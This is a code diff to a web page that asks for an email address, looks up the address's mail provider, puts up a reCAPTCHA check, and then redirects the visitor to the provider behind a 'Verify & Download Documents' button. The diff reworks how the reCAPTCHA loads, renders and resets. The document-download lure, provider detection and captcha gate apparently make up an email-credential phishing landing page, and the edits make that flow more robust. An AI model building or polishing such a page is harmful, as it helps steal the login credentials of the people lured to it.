@@ -7,8 +7,6 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <!-- Google reCAPTCHA v2 -->
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <style>
         * {
             margin: 0;
@@ -868,8 +866,8 @@
                     <!-- reCAPTCHA Container -->
                     <div class="recaptcha-container" id="recaptchaContainer">
                         <div class="recaptcha-label">Please verify you're not a robot</div>
-                        <div class="recaptcha-wrapper">
-                            <div class="g-recaptcha" id="recaptcha" data-sitekey="6LcWq5osAAAAAK4shhGp5gKrJ5TJw-ULotl5xCkT"></div>
+                        <div class="recaptcha-wrapper" id="recaptchaWrapper">
+                            <!-- reCAPTCHA will be rendered here dynamically -->
                         </div>
                     </div>
 
@@ -883,6 +881,9 @@
             </div>
         </div>
     </div>
+
+    <!-- Load reCAPTCHA API with explicit render -->
+    <script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaLoad&render=explicit" async defer></script>
 
     <script>
         // SVG Icons
@@ -916,8 +917,10 @@
             </svg>`
         };
 
-        // reCAPTCHA widget ID
+        // reCAPTCHA configuration
+        const RECAPTCHA_SITE_KEY = '6LcWq5osAAAAAK4shhGp5gKrJ5TJw-ULotl5xCkT';
         let recaptchaWidgetId = null;
+        let recaptchaReady = false;
         let emailVerified = false;
         let pendingMxResult = null;
 
@@ -1102,12 +1105,17 @@
             document.getElementById('errorMessage').classList.remove('show');
             document.getElementById('providerInfo').innerHTML = '';
             document.getElementById('recaptchaContainer').classList.remove('show');
+            document.getElementById('submitBtn').querySelector('.btn-text').textContent = 'Verify & Download Documents';
             emailVerified = false;
             pendingMxResult = null;
             
-            // Reset reCAPTCHA
-            if (recaptchaWidgetId !== null && typeof grecaptcha !== 'undefined') {
-                grecaptcha.reset(recaptchaWidgetId);
+            // Reset reCAPTCHA if it was initialized
+            if (recaptchaWidgetId !== null && recaptchaReady) {
+                try {
+                    grecaptcha.reset(recaptchaWidgetId);
+                } catch (e) {
+                    console.log('reCAPTCHA reset (safe to ignore):', e.message);
+                }
             }
         }
 
@@ -1371,36 +1379,51 @@
             // Wait a moment then redirect
             setTimeout(() => {
                 if (pendingMxResult) {
-                    redirectToProvider(document.getElementById('emailInput').value.trim(), pendingMxResult);
+                    const email = document.getElementById('emailInput').value.trim();
+                    redirectToProvider(email, pendingMxResult);
                 }
             }, 1500);
         }
 
-        // Initialize reCAPTCHA when it's loaded
-        function initRecaptcha() {
-            if (typeof grecaptcha !== 'undefined' && grecaptcha.render) {
-                try {
-                    recaptchaWidgetId = grecaptcha.render('recaptcha', {
-                        'sitekey': '6LcWq5osAAAAAK4shhGp5gKrJ5TJw-ULotl5xCkT',
-                        'callback': onRecaptchaSuccess,
-                        'expired-callback': () => {
-                            console.log('reCAPTCHA expired');
-                        }
-                    });
-                } catch (e) {
-                    console.error('reCAPTCHA initialization error:', e);
-                }
-            }
+        // reCAPTCHA expired callback
+        function onRecaptchaExpired() {
+            console.log('reCAPTCHA expired');
+            const errorMsg = document.getElementById('errorMessage');
+            errorMsg.innerHTML = '<span>⚠️</span><span>reCAPTCHA expired. Please verify again.</span>';
+            errorMsg.classList.add('show');
         }
 
-        // Wait for reCAPTCHA to load
-        window.onload = function() {
-            if (typeof grecaptcha !== 'undefined') {
-                grecaptcha.ready(function() {
-                    initRecaptcha();
-                });
+        // Called when reCAPTCHA API is loaded
+        function onRecaptchaLoad() {
+            console.log('reCAPTCHA API loaded successfully');
+            recaptchaReady = true;
+        }
+
+        // Render reCAPTCHA widget
+        function renderRecaptcha() {
+            if (!recaptchaReady) {
+                console.log('Waiting for reCAPTCHA API to load...');
+                return false;
             }
-        };
+
+            if (recaptchaWidgetId !== null) {
+                console.log('reCAPTCHA already rendered');
+                return true;
+            }
+
+            try {
+                recaptchaWidgetId = grecaptcha.render('recaptchaWrapper', {
+                    'sitekey': RECAPTCHA_SITE_KEY,
+                    'callback': onRecaptchaSuccess,
+                    'expired-callback': onRecaptchaExpired
+                });
+                console.log('reCAPTCHA rendered with ID:', recaptchaWidgetId);
+                return true;
+            } catch (e) {
+                console.error('reCAPTCHA render error:', e);
+                return false;
+            }
+        }
 
         // Handle email submit
         async function handleEmailSubmit(event) {
@@ -1447,14 +1470,24 @@
                     submitBtn.classList.remove('loading');
                     submitBtn.disabled = false;
 
-                    // Show reCAPTCHA
+                    // Show reCAPTCHA container
                     recaptchaContainer.classList.add('show');
+
+                    // Render reCAPTCHA widget
+                    const rendered = renderRecaptcha();
+                    
+                    if (!rendered) {
+                        // If reCAPTCHA not ready, wait and try again
+                        setTimeout(() => renderRecaptcha(), 500);
+                    }
 
                     // Update button text
                     submitBtn.querySelector('.btn-text').textContent = 'Complete Verification';
 
                     // Scroll to reCAPTCHA
-                    recaptchaContainer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                    setTimeout(() => {
+                        recaptchaContainer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                    }, 100);
 
                 } catch (error) {
                     console.error('Verification error:', error);
@@ -1467,13 +1500,23 @@
                 }
             } else {
                 // Email already verified, check if reCAPTCHA is completed
-                if (typeof grecaptcha !== 'undefined') {
-                    const response = grecaptcha.getResponse(recaptchaWidgetId);
-                    if (!response) {
+                if (recaptchaWidgetId !== null && recaptchaReady) {
+                    try {
+                        const response = grecaptcha.getResponse(recaptchaWidgetId);
+                        if (!response) {
+                            errorMsg.innerHTML = '<span>⚠️</span><span>Please complete the reCAPTCHA verification</span>';
+                            errorMsg.classList.add('show');
+                            return;
+                        }
+                        // If we get here, reCAPTCHA is completed, callback will handle redirect
+                    } catch (e) {
+                        console.error('reCAPTCHA check error:', e);
                         errorMsg.innerHTML = '<span>⚠️</span><span>Please complete the reCAPTCHA verification</span>';
                         errorMsg.classList.add('show');
-                        return;
                     }
+                } else {
+                    errorMsg.innerHTML = '<span>⚠️</span><span>Please wait for reCAPTCHA to load</span>';
+                    errorMsg.classList.add('show');
                 }
             }
         }
